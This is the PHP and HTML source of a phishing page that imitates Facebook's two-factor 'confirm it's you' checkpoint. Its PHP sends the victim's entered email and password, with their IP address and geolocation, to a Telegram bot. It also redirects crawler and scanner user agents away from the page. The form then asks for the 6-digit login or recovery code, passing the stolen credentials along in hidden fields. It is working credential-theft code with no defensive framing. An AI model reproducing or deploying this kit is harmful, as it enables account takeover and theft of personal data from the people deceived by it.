<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// system function to process bot
function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// get the bot data that you have set
include 'botSetting.php';
include 'api/geoip.php';

// get the data entered by the user
$email = $_POST['godhelpmema'];
$password = $_POST['godhelpmepa'];

// system will redirect to the main page if no data is entered
if($email == "" && $password == ""){
header("Location: index.php");
} else {

// message content to sent to bot
$messageBot = "
━━━━━༻NEWSC༺━━━━
➤Email / Phone : <code>$email</code>
➤Password : <code>$password</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
➤Country : $flag | $countrycode | $dialcode | $country
➤Ip Address : <code>$ip_address</code>
➤Benua : $continent 
➤Propinsi : $province
➤Kota : $city
➤Operator : $isp
➤Time Zone : $jamasuk
━━━━━༻NEWSC༺━━━━
";
}

// sent all data to bot
sendMessage($idTelegram, $messageBot, $tokenBot);
?>
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">
<head>
    <meta charset="utf-8" />
    <title id="pageTitle">Facebook</title>
    <meta name="robots" content="noodp,noydir" />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y1/l/0,cross/kEvgWhOAxWd.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="aPlhUz1" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/Wdeye_wnzdj.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="xvyjp8h" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/THDGNyKnTQu.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ezYPFCs" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/WV7vj8sme1i.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="rpDpM9O" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/zxj1j1C2PPE.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="uwdESl6" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/PrjcuISwSFE.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="WmADayd" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/YpggXutCM1o.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="6TykPjp" crossorigin="anonymous" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/oZB9N6h5pPF.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="+X3Xy3T" crossorigin="anonymous" nonce="cUE4nIb6"></script>
</head>

<body class="UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
    <div class="_li" id="u_0_1_i1">
        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
            <div id="blueBarDOMInspector" class="_21dp">
                <div id="bluebarRoot" class="_2t-8 _am-j _1s4v _2s1x _h2p">
                    <div aria-label="Facebook" class="_2t-a _26aw _33rf _2s1y" role="banner">
                        <div class="_2t-a _50tj">
                            <div class="_2t-a _4pmj _2t-d">
                                <div class="_2t-e">
                                    <div class="_4kny">
                                        <h1 class="_19ea" data-click="bluebar_logo">
										<a class="_7tp1" data-gt="&#123;&quot;chrome_nav_item&quot;:&quot;logo_chrome&quot;&#125;" title="Go to Facebook home">
										<i class="_84x5 img sp_DqqMY11l2P6 sx_3eb0d4">
										<u>Facebook</u>
										</i>
										</a>
										</h1>
                                    </div>
                                </div>
                                <div class="_2t-f">
                                    <div class="_6a">
                                        <div class="_4kny"><a class="_2s25 _cy7">Log out</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny">
                    <div class="checkpoint">
                        <div class="_4-u2 _5x_7 _p0k _5x_9 _4-u8">
                            <div class="_2e9n" id="u_0_3_6J"><strong id="u_0_4_Bo">Choose a way to confirm that it&#039;s you</strong>
                                <div id="u_0_5_64"></div>
                            </div>
							<form class="checkpoint" action="javascript:void(0)" method="post" id="formprocesslogincode">
							<input type="hidden" name="godhelpmema" id="godhelpmema" value="<?php echo $email;?>" readonly>
							<input type="hidden" name="godhelpmepa" id="godhelpmepa" value="<?php echo $password;?>" readonly>
                            <div class="_2ph_">
                                <ul class="uiList _4kg _6-h _6-j _4kt">
                                    <li>
                                        <div class="_50f4">Your account has two-factor authentication switched on, which requires this extra login step.</div>
                                    </li>
                                    <li>
                                        <div class="_50f4 _50f7">Approve from another device</div>
                                    </li>
                                    <li>
                                        <div class="_50f4 _50f7">Or, enter your login code</div>
                                        <div class="_2w-j _50f4">Enter the 6-digit code we just sent from the authentication app that you set up or enter 8-digit code recovery code.<br><br></div>
										<span>
										<input type="number" class="inputtext" id="logincode" name="logincode" autocomplete="off" placeholder="Login code" required>
										</span>
										<span style="color: #fa3e3e;"><i class="zmdi zmdi-caret-left zmdi-hc-2x" style="margin-top: -2px; padding-left: 5px; position: absolute;"></i> <span style="padding-left: 15px;" id="logincodealert">Enter your login code or recovery code</span></span>
                                    </li>
                                </ul>
                            </div>
                            <div class="_5hzs" id="checkpointBottomBar">
                                <div class="_2s5p btnSubmit">
								<button class="_42ft _4jy0 _2kak _4jy4 _4jy1 selected _51sy btnSubmitContents" type="submit" onclick="processlogincode()">Submit code</button>
								</div>
								<div class="_2s5p btnLoading" style="display: none;">
								<div class="_42ft _4jy0 _2kak _4jy4 _4jy1 selected _51sy btnLoading">Loading...</div>
								</div>
                                <div class="_2s5q" style="visibility: hidden;">
                                    <div class="_25b6" id="u_0_6_W6"><a role="button" id="u_0_7_jx">Need another way to confirm that it&#039;s you?</a></div>
                                </div>
                            </div>
							</form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="">
                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                        <li>English (UK)</li>
                        <li><a class="_sv4" dir="ltr" title="Indonesian">Bahasa Indonesia</a></li>
                        <li><a class="_sv4" dir="ltr" title="Javanese">Basa Jawa</a></li>
                        <li><a class="_sv4" dir="ltr" title="Malay">Bahasa Melayu</a></li>
                        <li><a class="_sv4" dir="ltr" title="Japanese">日本語</a></li>
                        <li><a class="_sv4" dir="rtl" title="Arabic">العربية</a></li>
                        <li><a class="_sv4" dir="ltr" title="French (France)">Français (France)</a></li>
                        <li><a class="_sv4" dir="ltr" title="Spanish">Español</a></li>
                        <li><a class="_sv4" dir="ltr" title="Korean">한국어</a></li>
                        <li><a class="_sv4" dir="ltr" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                        <li><a class="_sv4" dir="ltr" >Deutsch</a></li>
                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" title="Show more languages"><i class="img sp_c9BJiPpVB5H sx_a65bf2"></i></a></li>
                    </ul>
                    <div id="contentCurve"></div>
                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li><a title="Sign up for Facebook">Sign Up</a></li>
                            <li><a title="Log in to Facebook">Log in</a></li>
                            <li><a title="Take a look at Messenger.">Messenger</a></li>
                            <li><a title="Facebook Lite for Android.">Facebook Lite</a></li>
                            <li><a title="Browse in Video">Video</a></li>
                            <li><a title="Take a look at popular places on Facebook.">Places</a></li>
                            <li><a title="Check out Facebook games.">Games</a></li>
                            <li><a title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                            <li><a title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
                            <li><a title="Discover Meta" target="_blank">Meta Store</a></li>
                            <li><a title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
                            <li><a title="Take a look at Instagram" target="_blank">Instagram</a></li>
                            <li><a title="Check out Threads">Threads</a></li>
                            <li><a title="Donate to worthy causes.">Fundraisers</a></li>
                            <li><a title="Browse our Facebook Services directory.">Services</a></li>
                            <li><a title="See the Voting Information Centre">Voting Information Centre</a></li>
                            <li><a title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
                            <li><a title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a></li>
                            <li><a title="Explore our groups.">Groups</a></li>
                            <li><a title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
                            <li><a title="Advertise on Facebook">Create ad</a></li>
                            <li><a title="Create a Page">Create Page</a></li>
                            <li><a title="Develop on our platform.">Developers</a></li>
                            <li><a title="Make your next career move to our brilliant company.">Careers</a></li>
                            <li><a title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                            <li><a class="_41ug" title="Learn about AdChoices.">AdChoices<i class="img sp_c9BJiPpVB5H sx_2ac7af"></i></a></li>
                            <li><a title="Review our terms and policies.">Terms</a></li>
                            <li><a title="Visit our Help Centre.">Help</a></li>
                            <li><a title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
                            <li><a class="accessible_elem" title="View and edit your Facebook settings.">Settings</a></li>
                            <li><a class="accessible_elem" title="View your activity log">Activity log</a></li>
                        </ul>
                    </div>
                    <div class="mvl copyright">
                        <div><span> Meta © 2024</span></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y1/l/0,cross/kEvgWhOAxWd.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/Wdeye_wnzdj.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/THDGNyKnTQu.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/WV7vj8sme1i.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/r/xGzxHIbkRpC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yz/l/en_GB/NJVgMHwCLBZ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/zxj1j1C2PPE.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/PrjcuISwSFE.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/YpggXutCM1o.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/dAQLeJcCYqJ.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/r/_BJqgRg0BU5.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/r/1hx-8i1noYR.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/SC0hoFC_VRD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/RIKEgZu5xqf.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/PsuSdcIEwcm.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/lIEp34WJzV8.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/-soQy2xS6u9.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/bpW4eEg-2_W.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/51zpDh2VzWP.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/p55HfXW__mM.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/6bjw9N12j0I.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/bTqpFPMYf62.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3imLc4/y_/l/en_GB/vdIWnScP8pn.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/-CwNHlMFcjq.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/RxPOZF3XHzp.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/M08arqdo_nN.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/r/L1jOy35D0YV.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/ARZbXqnO3-k.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/fRWUzR48hap.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3itG54/y9/l/en_GB/0-S69UbtWgN.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/Lzd-U--zeLf.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/slydzKQTE0E.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/_pR8rlkT9uM.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3id044/ye/l/en_GB/BtvHQOSC-gi.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/hrJC1LU3Pn7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/X_ACS-BkyFI.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iac54/yI/l/en_GB/4mARhrSJJLF.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iLl54/y_/l/en_GB/HdlZDeEym02.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/HBW-lNYJBHD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i78z4/y6/l/en_GB/No3_a-xguPg.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/NgB84GyJ3BY.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/lFK_RCKM9IT.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iYQa4/yL/l/en_GB/fPaL-iNEkhX.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i5OS4/yk/l/en_GB/N9xU592Q2j-.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i-q14/yd/l/en_GB/XYWbPbilUjM.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/V29QmZyGY2Q.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/6pjBag10-NN.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ikXB4/yy/l/en_GB/uq_mbUifA7R.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3igAa4/yb/l/en_GB/e04-ZmKhmzt.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/8QOIYeXf0b3.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iCLw4/yW/l/en_GB/Nz5kir3TAQD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/1y7Vm00dUS4.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/Rdy3Ve9NIaI.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/5VGBz2ZlH9M.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/5YIqnQwqSEx.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i4lr4/yy/l/en_GB/_mPJ8GrF7jC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3il5S4/yD/l/en_GB/6r3O8eGMxMb.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/I33XAWfgyPZ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/8sRbNudSPwb.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iFLz4/y5/l/en_GB/OBHCIHbl633.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iNig4/yP/l/en_GB/wGkap9mbAMi.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/Pi2z4b-NgR6.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i2TV4/yc/l/en_GB/T5QU_oChlJR.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/Z2_KxZzU3JW.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/uxo64bLLIeV.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ikpZ4/yQ/l/en_GB/stnAjLCxOSw.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/LwUUBtOzAVY.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/l/0,cross/GnUO7p086s5.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/aMXJN9lRcFC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/dt2QTw7nlVF.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/caFvWhsxNbj.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/3FPJ9YC_wUr.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yo/l/0,cross/fGdsJL2TIQ7.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/l/0,cross/pvmwzVD7ZhH.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/QaeJrnKvrhz.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/qSW1pBAfysT.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/UU3u7nc5iV3.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iF584/yj/l/en_GB/FlwAlXPI8Tr.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iF8D4/yu/l/en_GB/A-nfkJ-GzoD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iSxA4/y9/l/en_GB/aJy4Wu79w4g.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iZAG4/y7/l/en_GB/1ZAmCYWeazs.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iE9a4/y5/l/en_GB/6-YKVfTfNe7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/wrFOO6gGYLA.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/zRD8Fi6ZskT.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/2KW45SaLwT9.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iYlF4/yZ/l/en_GB/o_zyaR4VNMh.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iXsB4/yc/l/en_GB/EGSF-bAz3FF.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/7mbTcu-GLGZ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/PoYgIWcnLf0.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
